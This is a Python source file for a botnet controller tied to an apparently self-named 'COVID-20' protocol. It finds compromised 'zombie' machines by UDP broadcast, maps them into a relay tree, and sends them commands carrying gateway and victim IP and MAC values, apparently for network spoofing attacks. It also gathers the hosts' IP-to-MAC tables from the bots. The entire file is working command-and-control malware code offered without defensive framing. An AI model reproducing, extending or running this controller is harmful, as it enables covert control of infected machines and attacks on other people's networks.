import socket
import time
import Protocol

from Utils import *
from Zombie import Zombie


def get_all_tree(zombie_lst, flag_lst=None):
    if not flag_lst:
        flag_lst = []

    for z in zombie_lst:
        flag_lst.append(z)
        get_all_tree(z.branches, flag_lst)

    return flag_lst


def print_sub_tree(zombie_lst, height=0, flag_lst=None):
    if not flag_lst:
        flag_lst = []

    for z in zombie_lst:
        flag_lst.append(z)

        print(f'[{height}]', '\t' * height, z.adr)

        print_sub_tree(z.branches, height + 1)


class BotMater:

    def __init__(self, my_ip, gateway, subnet):

        self.__network = my_ip
        self.__gateway = gateway
        self.__subnet = subnet

        self.__udp_port = 54000
        self.__tcp_port = 55000
        self.__udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.__udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.__udp_sock.bind(('', 0))

        self.__zombie_lst = []
        self.__results = {}

        self.__id = 0

    # =========================================================================== #

    def __zombie_exists(self, zombie):

        """
        checks if a zombie exists in the 1-hop branches
        """
        for z in self.__zombie_lst:
            if zombie.equals(z):
                return True
        return False

    def __choose_zombie_index(self, index):

        """
        returns get zombie by index (shown by show_zombies operation)
        """
        try:
            zombie = self.__zombie_lst[index]
            return zombie
        except IndexError:
            print("--invalid zombie index--")

    def __add_zombie(self, adr):

        """
        :param adr: (ip, port) - tuple
        :returns: the added zombie (could be None)
        """

        # build a zombie object
        zombie = Zombie(adr)

        # if not already in list
        if not self.__zombie_exists(zombie):
            self.__zombie_lst.append(zombie)  # add zombie
            return zombie


    def __get_zombie_by_adr(self, adr):
        for z in self.__zombie_lst:
            if z.adr == adr:
                return z

    # =========================================================================== #

    def search_for_bots(self):

        """
        Sends broadcast msgs in the subnet.
        Searching for bots in local network.
        """
        data = Protocol.keep_alive()
        # broad cast address (gateway | ~(subnet)) => broadcast
        self.__udp_sock.sendto(data, (Protocol.int2ip(Protocol.ip2int(self.__gateway)
                                                      | ~Protocol.ip2int(self.__subnet) + 2 ** 32),
                                      self.__udp_port))

    def show_zombies(self):

        """
        prints the 1-hop zombies
        """
        for zombie_index in range(len(self.__zombie_lst)):
            print('[+]', zombie_index, self.__zombie_lst[zombie_index].adr)

    def get_zombie_tree(self):

        """
        update a zombie tree.
        """

        # get users zombie choice (1 hop zombies)
        opt = safe_cast(input("\t[+][get_zombie_tree] choose a zombie index (-1 for canceling)\n\t"), int, default=-1)

        # cancel if -1
        if opt == -1:
            return

        # get the zombie from list
        zombie: Zombie = self.__choose_zombie_index(opt)

        # check if user entered valid index
        if zombie:
            # create network sync request
            p2p = Protocol.P2PCommunication()

            # command useless => default build
            command = Protocol.Command()

            # create botnet pack based on the COVID-20 protocol
            botnet_pack = Protocol.BotnetPack(type=Protocol.TYPES.NETWORK_SYNC_REQUEST,
                                              p2pCommunication=p2p,
                                              command=command)

            # send request to zombie
            self.__udp_sock.sendto(botnet_pack.create_byte_stream(type=Protocol.TYPES.NETWORK_SYNC_REQUEST), zombie.adr)

    def show_entire_network(self):
        print_sub_tree(self.__zombie_lst, 0)

    def send_command(self):

        bot = input("\t[+][send_command]\t\nbot:\t\npublic_ip|public_port|private_ip|private_port (-1 for "
                    "canceling)\n")
        operation = input(
            "\t[+][send_command]\t\ncommand settings:\t\nact|g_ip|v_ip|g_mac|v_mac (-1 for canceling)\n")

        bot = bot.split('|')

        public_ip = bot[0]
        public_port = int(bot[1])
        private_ip = bot[2]
        private_port = int(bot[3])

        settings = operation.split('|')

        act = int(settings[0])

        if len(settings) == 2:
            g_ip = 0
            v_ip = 0
            g_mac = '0' * 6
            v_mac = '0' * 6
        else:
            g_ip = Protocol.ip2int(settings[1])
            v_ip = Protocol.ip2int(settings[2])
            g_mac = settings[3].split('-')
            v_mac = settings[4].split('-')

        command = Protocol.Command(
            act=act,
            g_ip=g_ip,
            v_ip=v_ip,
            g_mac=g_mac,
            v_mac=v_mac
        )

        P2PCommunication = Protocol.P2PCommunication(
            id=self.__id,
            dst_ip=Protocol.ip2int(public_ip),
            dst_port=public_port,
            pdst_ip=Protocol.ip2int(private_ip),
            pdst_port=private_port
        )

        pack = Protocol.BotnetPack(
            type=Protocol.TYPES.COMMAND,
            command=command,
            p2pCommunication=P2PCommunication
        )

        # if not local
        if not public_ip == '0' and not private_ip == '0':

            # find the zombie object
            target_zombie = find_node(Zombie((public_ip, public_port)), self.__zombie_lst)

            # search for public path
            next_node = find_path(target_zombie, self.__zombie_lst)

        else:

            # local => next_node is the same as target
            target_zombie = next_node = self.__choose_zombie_index(safe_cast(input("choose zombie index: "), int))

        if next_node:

            # for identifying the zombie when there are command results
            self.__results[self.__id] = target_zombie

            # increment __id (max short ^16)
            self.__id += 1
            if self.__id == 2 ** 16 - 1:
                self.__id = 0

            # send the command
            self.__udp_sock.sendto(pack.create_byte_stream(Protocol.TYPES.COMMAND), next_node.adr)

    def show_ip_macs(self):
        zombie_lst = get_all_tree(self.__zombie_lst)

        if not zombie_lst:
            print('no zombies found')
            return

        index = safe_cast(input("choose zombie index"), int)

        if index >= len(zombie_lst):
            print('---invalid index---')
        else:
            print(zombie_lst[index].hosts)

    # =========================================================================== #

    def handle_incomings(self):

        """
        Handles incoming msgs for implementing the COVID-20 project protocol.
        """

        while True:

            # get the raw data and adr tup (ip, port)
            data, adr = self.__udp_sock.recvfrom(4096)

            # extract the protocol type
            type = Protocol.get_type(data)

            # go over the possible options
            if type == Protocol.TYPES.KEEP_ALIVE_ACK:  # ======

                # add the zombie (managing duplicates in func)
                self.__add_zombie(adr)

            elif type == Protocol.TYPES.NETWORK_SYNC_REPLY:  # ======

                # get the base node
                base_adr, n_branches = Protocol.get_base(data)

                # get the base node's branches as a list
                z_adr_lst = Protocol.get_peer_branches(data, n_branches)

                # check if local peer
                if base_adr == ('0.0.0.0', 0):

                    # get the peer
                    zombie = self.__get_zombie_by_adr(adr)  # raw address client

                else:

                    # find the node in the botnet tree
                    zombie = find_node(Zombie(base_adr), self.__zombie_lst)

                # check if zombie was found
                if zombie:

                    # add zombie's branches
                    for z_adr in z_adr_lst:
                        zombie.add_zombie(Zombie(z_adr))

            elif type == Protocol.TYPES.COMMAND_RESULT:  # ======

                # get zombie who executed the command
                zombie = self.__results[Protocol.get_id(data)]

                # add the data to the zombie's {ip:mac}
                zombie.hosts.update(Protocol.get_ip_mac(data))

            time.sleep(0.05)
